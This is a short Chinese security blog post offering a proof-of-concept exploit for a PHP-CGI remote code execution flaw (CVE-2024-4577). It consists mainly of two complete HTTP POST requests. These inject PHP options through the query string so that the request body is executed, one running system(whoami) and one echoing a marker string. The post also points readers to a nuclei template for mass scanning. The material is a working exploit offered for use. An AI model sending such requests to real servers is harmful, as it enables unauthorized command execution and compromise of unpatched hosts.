#  PHP 最新RCE POC (nuclei文件) (内含抽奖)   
原创 fkalis  fkalis   2024-06-08 13:10  
  
**1. 手工复现**  
  
**验证poc：**  
```
POST /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1
Host: xxx.xxx.xxx
REDIRECT-STATUS:1
Content-type: text/html; charset=UTF-8
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

<?php echo system(whoami);?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfnpNibNgp54lwzo03aia3Nwr9uLOgpCh9nHsn2wcickRWRqan0OA3wPEdAibpFHxQFOmqENrvpDtD2FQ/640?wx_fmt=png&from=appmsg "")  
  
  
**无危害验证poc：**  
```
POST /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1
Host: xxx.xxx.xxx
REDIRECT-STATUS:1
Content-type: text/html; charset=UTF-8
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

<?php echo "fkalis";?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfnpNibNgp54lwzo03aia3Nwr8gIWmJvyh1e7VwhnicwGQnRC98jwg80psT5yyLK2XDzeqIIgN3Vna6Q/640?wx_fmt=png&from=appmsg "")  
  
  
**2. nuclei批量化验证**  
  
**进入【fkalis】公众号**  
  
**回复关键字【CVE-2024-4577****】获取批量化yaml文件**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfnpNibNgp54lwzo03aia3NwrYhZP8Kia4FibN5icFOUBACPdBn2j6ibnYMgLO7GMeOUdsL3BWyfVD0iarzQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**3. 端午抽奖**  
> **祝各位师傅端午节快乐，技术越来越牛逼！！**  
  
  
  
[]()  
  
  
****  
  
  
  
  
  
  
